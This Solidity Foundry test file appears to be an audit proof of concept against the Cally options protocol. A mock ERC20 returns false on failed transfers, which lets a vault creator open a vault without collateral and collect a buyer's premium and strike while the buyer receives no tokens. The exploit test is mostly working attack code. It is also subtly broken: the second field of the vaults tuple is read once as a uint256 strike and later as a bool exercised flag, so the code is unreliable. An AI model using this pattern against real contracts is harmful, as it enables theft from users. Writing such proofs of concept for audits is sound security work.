// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../../src/Cally.sol";
import "solmate/tokens/ERC20.sol";

// Mock ERC20 token that returns false on transfer failures (like ZRX)
contract MockFaultyERC20 is ERC20 {
    bool public shouldFailTransfer;
    
    constructor() ERC20("Mock", "MOCK", 18) {
        shouldFailTransfer = false;
    }
    
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
    
    function setShouldFailTransfer(bool _shouldFail) external {
        shouldFailTransfer = _shouldFail;
    }
    
    // Override transferFrom to return false instead of reverting when shouldFailTransfer is true
    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (shouldFailTransfer) {
            return false;
        }
        return super.transferFrom(from, to, amount);
    }
    
    // Override transfer to return false instead of reverting when shouldFailTransfer is true
    function transfer(address to, uint256 amount) public override returns (bool) {
        if (shouldFailTransfer) {
            return false;
        }
        return super.transfer(to, amount);
    }
}

contract ExploitTest is Test {
    Cally public cally;
    MockFaultyERC20 public faultyToken;
    
    address public vaultCreator;
    address public optionBuyer;
    
    event NewVault(uint256 indexed vaultId, address indexed from, address indexed token);
    event BoughtOption(uint256 indexed optionId, address indexed from, address indexed token);
    event ExercisedOption(uint256 indexed optionId, address indexed from);
    
    function setUp() public {
        // Deploy contracts
        cally = new Cally();
        faultyToken = new MockFaultyERC20();
        
        // Setup test addresses
        vaultCreator = address(0x1);
        optionBuyer = address(0x2);
        
        // Fund accounts
        vm.deal(vaultCreator, 100 ether);
        vm.deal(optionBuyer, 100 ether);
        
        // Mint tokens to vault creator
        vm.prank(address(this));
        faultyToken.mint(vaultCreator, 1000 * 1e18);
    }
    
    function testExploitFaultyERC20Transfer() public {
        // Step 1: Configure the token to fail transfers (return false instead of reverting)
        faultyToken.setShouldFailTransfer(true);
        
        // Step 2: Vault creator attempts to create a vault with 100 tokens
        // The transfer will fail but return false, so the vault is still created
        vm.startPrank(vaultCreator);
        
        // Approve the Cally contract to spend tokens
        faultyToken.approve(address(cally), 100 * 1e18);
        
        // Create vault - this will succeed even though the token transfer fails
        uint256 vaultId = cally.createVault(
            100 * 1e18, // amount
            address(faultyToken), // token
            0, // premiumIndex (0.01 ether)
            7, // durationDays
            0, // dutchAuctionStartingStrikeIndex (1 ether)
            0.5 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Step 3: Verify the vault was created
        assertEq(cally.ownerOf(vaultId), vaultCreator, "Vault should be owned by creator");
        
        // Step 4: Verify no tokens were actually transferred to the contract
        assertEq(faultyToken.balanceOf(address(cally)), 0, "Cally should have no tokens");
        assertEq(faultyToken.balanceOf(vaultCreator), 1000 * 1e18, "Creator should still have all tokens");
        
        // Step 5: Option buyer buys an option from the vault
        vm.startPrank(optionBuyer);
        
        // Get the premium required
        uint256 premium = cally.getPremium(vaultId);
        assertEq(premium, 0.01 ether, "Premium should be 0.01 ether");
        
        // Buy the option
        uint256 optionId = cally.buyOption{value: premium}(vaultId);
        
        vm.stopPrank();
        
        // Step 6: Verify the option was bought and premium was credited
        assertEq(cally.ownerOf(optionId), optionBuyer, "Option should be owned by buyer");
        
        // Check vault creator's ETH balance (should have received the premium)
        uint256 creatorEthBalance = cally.ethBalance(vaultCreator);
        assertEq(creatorEthBalance, premium, "Creator should have received the premium");
        
        // Step 7: Option buyer exercises the option
        vm.startPrank(optionBuyer);
        
        // Get the current strike price
        (, uint256 currentStrike,,,,,,,) = cally.vaults(vaultId);
        
        // Exercise the option
        cally.exercise{value: currentStrike}(optionId);
        
        vm.stopPrank();
        
        // Step 8: Verify the exploit worked
        // The option buyer should NOT have received any tokens (since none were deposited)
        assertEq(faultyToken.balanceOf(optionBuyer), 0, "Option buyer should not receive any tokens");
        
        // The vault creator should have received both premium and strike
        uint256 finalCreatorEthBalance = cally.ethBalance(vaultCreator);
        assertEq(finalCreatorEthBalance, premium + currentStrike, "Creator should have premium + strike");
        
        // The vault should be marked as exercised
        (, bool isExercised,,,,,,,) = cally.vaults(vaultId);
        assertTrue(isExercised, "Vault should be marked as exercised");
        
        // Step 9: Vault creator can harvest their ill-gotten gains
        vm.startPrank(vaultCreator);
        uint256 initialBalance = vaultCreator.balance;
        cally.harvest();
        uint256 finalBalance = vaultCreator.balance;
        vm.stopPrank();
        
        // Verify the creator received the ETH
        assertEq(finalBalance - initialBalance, premium + currentStrike, "Creator should harvest all ETH");
        
        // The exploit is complete - the vault creator received ETH without providing any collateral
        // and the option buyer lost their premium + strike without receiving any tokens
    }
    
    function testNormalERC20TransferWorks() public {
        // This test shows that with a normal ERC20 token, the exploit doesn't work
        
        // Configure the token to NOT fail transfers
        faultyToken.setShouldFailTransfer(false);
        
        // Vault creator creates a vault with 100 tokens
        vm.startPrank(vaultCreator);
        
        // Approve the Cally contract to spend tokens
        faultyToken.approve(address(cally), 100 * 1e18);
        
        // Create vault
        uint256 vaultId = cally.createVault(
            100 * 1e18, // amount
            address(faultyToken), // token
            0, // premiumIndex (0.01 ether)
            7, // durationDays
            0, // dutchAuctionStartingStrikeIndex (1 ether)
            0.5 ether, // dutchAuctionReserveStrike
            Cally.TokenType.ERC20
        );
        
        vm.stopPrank();
        
        // Verify tokens were actually transferred to the contract
        assertEq(faultyToken.balanceOf(address(cally)), 100 * 1e18, "Cally should have the tokens");
        assertEq(faultyToken.balanceOf(vaultCreator), 900 * 1e18, "Creator should have 900 tokens left");
        
        // Option buyer buys and exercises the option
        vm.startPrank(optionBuyer);
        
        uint256 premium = cally.getPremium(vaultId);
        uint256 optionId = cally.buyOption{value: premium}(vaultId);
        
        (, uint256 currentStrike,,,,,,,) = cally.vaults(vaultId);
        cally.exercise{value: currentStrike}(optionId);
        
        vm.stopPrank();
        
        // Now the option buyer SHOULD receive the tokens
        assertEq(faultyToken.balanceOf(optionBuyer), 100 * 1e18, "Option buyer should receive the tokens");
        assertEq(faultyToken.balanceOf(address(cally)), 0, "Cally should have no tokens left");
    }
}